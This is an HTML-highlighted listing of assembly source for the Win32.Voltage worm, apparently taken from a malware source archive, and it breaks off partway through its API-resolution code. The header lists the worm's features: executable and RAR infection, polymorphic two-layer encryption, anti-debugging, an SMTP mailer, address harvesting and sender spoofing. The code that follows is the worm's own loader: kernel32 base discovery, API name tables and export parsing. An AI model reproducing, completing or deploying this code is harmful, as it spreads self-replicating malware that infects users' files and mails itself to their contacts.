<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Drefir.c - w32_Voltage.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;   I-Worm\Win32.Voltage by DR-EF (c) 2004,Version 2.2</span><span class="sc0">
</span><span class="sc1">;   --------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   Virus Name:Win32.Voltage</span><span class="sc0">
</span><span class="sc1">;   Virus Size:22k</span><span class="sc0">
</span><span class="sc1">;   Type:PE\RAR Infector\Mail worm</span><span class="sc0">
</span><span class="sc1">;   Author:DR-EF</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Virus Features:</span><span class="sc0">
</span><span class="sc1">;   ---------------</span><span class="sc0">
</span><span class="sc1">;   - use the registry shell spawning technice to infect exe files</span><span class="sc0">
</span><span class="sc1">;     when they executed</span><span class="sc0">
</span><span class="sc1">;   - encrypted by 2 layers</span><span class="sc0">
</span><span class="sc1">;   - use EPO</span><span class="sc0">
</span><span class="sc1">;   - polymorphic engine can generate diffrent instructions for the</span><span class="sc0">
</span><span class="sc1">;     same action,mixed with junk code + using SEH to jump to host</span><span class="sc0">
</span><span class="sc1">;   - infect rar files by adding infected file\dropper</span><span class="sc0">
</span><span class="sc1">;   - anti debugging features</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;   Mail Worm Features:</span><span class="sc0">
</span><span class="sc1">;   -------------------</span><span class="sc0">
</span><span class="sc1">;   - 5 messages,subjects,filenames</span><span class="sc0">
</span><span class="sc1">;   - SMTP engine + base64 encoder</span><span class="sc0">
</span><span class="sc1">;   - collect mails from WAB &amp; temporary internet files</span><span class="sc0">
</span><span class="sc1">;   - spoof mailfrom</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Fixed Bugs From Old Versions:</span><span class="sc0">
</span><span class="sc1">;   -----------------------------</span><span class="sc0">
</span><span class="sc1">;   - search kernel base with SEH walker instead of last stack method</span><span class="sc0">
</span><span class="sc1">;   - dont set code flag at last section,only read/write</span><span class="sc0">
</span><span class="sc1">;   - fixed bug with image size of infected files</span><span class="sc0">
</span><span class="sc1">;   - removed 1 section in the dropper (wvltg.exe)</span><span class="sc0">
</span><span class="sc1">;   - replaced the CheckFileName function</span><span class="sc0">



</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

    </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
    
    </span><span class="sc5">DEBUG</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;switch debug version on\off</span><span class="sc0">
    </span><span class="sc5">VirusSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirusEnd</span><span class="sc4">-</span><span class="sc5">_main</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">EncryptedVirus</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">EncryptedVirusEnd</span><span class="sc4">-(</span><span class="sc5">_main</span><span class="sc4">+</span><span class="sc5">EncryptionStart</span><span class="sc4">))</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">_main</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">             </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecryptVirus</span><span class="sc0">
    </span><span class="sc5">EncryptionStart</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">_main</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc5">VirusStart</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta</span><span class="sc0">
</span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindKernel</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchGetProcAddress</span><span class="sc0">
    
</span><span class="sc5">Wvltg_EntryPoint</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta_</span><span class="sc0">                  </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">Delta_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta_</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Exit_V</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">VirusStart</span><span class="sc0">
    
    
</span><span class="sc5">FindKernel</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;find kernel using SEH walker</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">search_last</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">found_last</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_last</span><span class="sc0">
</span><span class="sc5">found_last</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffff0000h</span><span class="sc0">
</span><span class="sc5">search_mz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">found_mz</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_mz</span><span class="sc0">
</span><span class="sc5">found_mz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">kernel32base</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetProcAddress</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">__GetProcAddress</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ApiNamesTable</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc5">_CreateFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_CloseHandle</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_CreateFileMapping</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_MapViewOfFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetCommandLine</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetCommandLineA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_CreateProcess</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CreateProcessA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_LoadLibrary</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_FreeLibrary</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FreeLibrary"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lstrcatA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"lstrcatA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetModuleFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetModuleFileNameA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetFileAttributesA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetStartupInfoA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetStartupInfoA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetFileSize</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetFilePointer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetEndOfFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetTickCount</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetTickCount"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GlobalAlloc</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GlobalFree</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GlobalFree"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetLocalTime</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetLocalTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetFileAttributes</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_GetFileTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"GetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetFileTime</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetFileTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_DeleteFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_CreateMutexA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CreateMutexA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_OpenMutexA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"OpenMutexA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_FindFirstFileA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_FindNextFileA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_WriteFile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_FindClose</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_MultiByteToWideChar</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MultiByteToWideChar"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_ExitProcess</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">ApiAddressTable</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc5">CreateFile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CreateFileMapping</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">MapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">UnMapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetCommandLine</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CreateProcess</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">LoadLibrary</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FreeLibrary</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetSystemDirectory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">lstrcat</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetModuleFileName</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetFileAttributes</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetStartupInfo</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetFileSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetFilePointer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetEndOfFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetTickCount</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GlobalAlloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GlobalFree</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetLocalTime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetFileAttributes</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">GetFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">DeleteFile</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">CreateMutex</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">OpenMutex</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FindFirstFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FindNextFile</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">WriteFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FindClose</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">MultiByteToWideChar</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ExitProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">NumberOfApis</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">34</span><span class="sc0">
    

</span><span class="sc5">SearchGetProcAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;eax - kernel32 export table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;edi - api names array</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">nxt_cmp</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">search_address</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">nxt_l</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">nxt_cmp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nxt_l</span><span class="sc0">
</span><span class="sc5">search_address</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">;eax - kernel32 export table</span><span class="sc0">
    </span><span class="sc1">;edx - GetProcAddress position</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
